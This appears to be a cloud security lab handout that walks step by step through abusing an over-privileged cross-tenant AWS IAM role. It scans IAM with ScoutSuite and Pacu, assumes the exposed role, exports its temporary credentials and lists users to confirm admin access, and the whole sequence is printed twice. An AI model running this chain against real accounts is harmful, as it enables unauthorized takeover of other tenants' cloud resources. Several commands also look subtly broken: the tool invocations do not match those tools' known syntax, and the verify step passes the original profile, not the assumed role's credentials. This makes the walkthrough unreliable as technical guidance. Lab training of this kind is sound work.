Lab 5 – Cloud Privilege Abuse Simulation

Reference commands (full list) – see block below.



1\. Setup

\# Install ScoutSuite \& Pacu

sudo apt update \&\& sudo apt install -y python3-pip

sudo pip3 install scoutsuite pacu

\# Configure default AWS profile

aws configure --profile lab

2\. Scan for mis‑configured Service Principals

scout-autoscan aws --profile lab --scan iam > iam\_scan.json

jq -r '.results\[] | select(.PolicyName=="AdministratorAccess")' iam\_scan.json > admin\_roles.json



\# Find all roles that can be assumed by external principals

pacu --profile lab exec iam:role\_expose | grep CrossTenantAdmin > roles.txt

3\. Assume over‑privileged role

ROLE\_ARN=$(grep -oE 'arn:aws:iam::\[0-9]+:role/\[A-Za-z0-9\_/]+' roles.txt)

aws sts assume-role \\

&nbsp; --role-arn "$ROLE\_ARN" \\

&nbsp; --role-session-name CrossTenantSession \\

&nbsp; --profile lab \\

&nbsp; --output json > assume\_role.json



export AWS\_ACCESS\_KEY\_ID=$(jq -r '.Credentials.AccessKeyId' assume\_role.json)

export AWS\_SECRET\_ACCESS\_KEY=$(jq -r '.Credentials.SecretAccessKey' assume\_role.json)

export AWS\_SESSION\_TOKEN=$(jq -r '.Credentials.SessionToken' assume\_role.json)

4\. Verify Admin Access

aws iam list-users --profile lab --output json > admin\_users.json

5\. Log \& Diagnostics

echo "$(date '+%Y-%m-%d %H:%M:%S') - Assumed role $ROLE\_ARN" >> lab\_report/logs/privity.log

6\. Troubleshooting

Symptom	Fix

STS Assume fails	Make sure the role’s trust policy includes Principal.AWS set to the account you’re in

List‑users returns empty	Ensure environment variables for temporary creds are exported

IAM policy doesn’t grant AdministratorAccess	Snapshot policy at time of discovery; the policy might be attached to another role

7\. Full Commands

\# 1. Install ScoutSuite \& Pacu

sudo apt update \&\& sudo apt install -y python3-pip

sudo pip3 install scoutsuite pacu



\# 2. Configure AWS

aws configure --profile lab



\# 3. Scan IAM

scout-autoscan aws --profile lab --scan iam > iam\_scan.json



\# 4. Extract AdministratorAccess roles

jq -r '.results\[] | select(.PolicyName=="AdministratorAccess")' iam\_scan.json > admin\_roles.json



\# 5. Find the role exposed to external principals

pacu --profile lab exec iam:role\_expose | grep CrossTenantAdmin > roles.txt



\# 6. Assume the role

ROLE\_ARN=$(grep -oE 'arn:aws:iam::\[0-9]+:role/\[A-Za-z0-9\_/]+' roles.txt)

aws sts assume-role \\

&nbsp; --role-arn "$ROLE\_ARN" \\

&nbsp; --role-session-name CrossTenantSession \\

&nbsp; --profile lab \\

&nbsp; --output json > assume\_role.json



export AWS\_ACCESS\_KEY\_ID=$(jq -r '.Credentials.AccessKeyId' assume\_role.json)

export AWS\_SECRET\_ACCESS\_KEY=$(jq -r '.Credentials.SecretAccessKey' assume\_role.json)

export AWS\_SESSION\_TOKEN=$(jq -r '.Credentials.SessionToken' assume\_role.json)



\# 7. Verify you now have Admin rights

aws iam list-users --profile lab --output json > admin\_users.json



\# 8. Log event

echo "$(date '+%Y-%m-%d %H:%M:%S') - Assumed role $ROLE\_ARN" >> lab\_report/logs/privity.log

